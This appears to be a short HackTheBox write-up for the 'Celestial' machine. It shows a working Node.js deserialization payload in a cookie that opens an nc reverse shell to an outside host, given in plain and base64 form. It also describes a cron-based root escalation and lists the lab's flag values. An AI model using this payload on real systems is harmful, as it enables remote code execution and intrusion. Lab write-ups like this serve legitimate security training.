# Celestial - 10.10.10.85 - HackTheBox

## Open Ports

3000 - NodeJS Framework (HTTP)

## Initial Foothold

Opening http://10.10.10.85:3000 gives 404 > refresh page > page content changed to `Hey Dummy 2 + 2 is 22`

We have a base64 encoded cookie with a name `profile`.

Decoded base64 cookie:

```
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
```

`username` param of the cookie appears to reflect in the page, to execute commands we can use this payload > encode it to base64 and use it as our cookie.

```
{"username":"_$$ND_FUNC$$_require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 1234 >/tmp/f', function(error, stdout, stderr) {console.log(stdout)})","country":"Lameville","city":"Lametown","num":"2"}
```


Base64 encoded cookie - 

```
eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygncm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuMiAxMjM0ID4vdG1wL2YnLCBmdW5jdGlvbihlcnJvciwgc3Rkb3V0LCBzdGRlcnIpIHtjb25zb2xlLmxvZyhzdGRvdXQpfSkiLCJjb3VudHJ5IjoiTGFtZXZpbGxlIiwiY2l0eSI6IkxhbWV0b3duIiwibnVtIjoiMiJ9
```

Received Shell from user `sun`

Spawned /bin/bash using `python -c "import pty;pty.spawn('/bin/bash')"`


# Privilege Escalation

`/home/sun/Documents/script.py` had a cronjob running on it by root every 5 minutes.
Echoed python reverse shell payload.

Got root shell!



## Flags
user.txt - `9a093cd22ce86b7f41db4116e80d0b0f`
root.txt - `ba1d0019200a54e370ca151007a8095a`
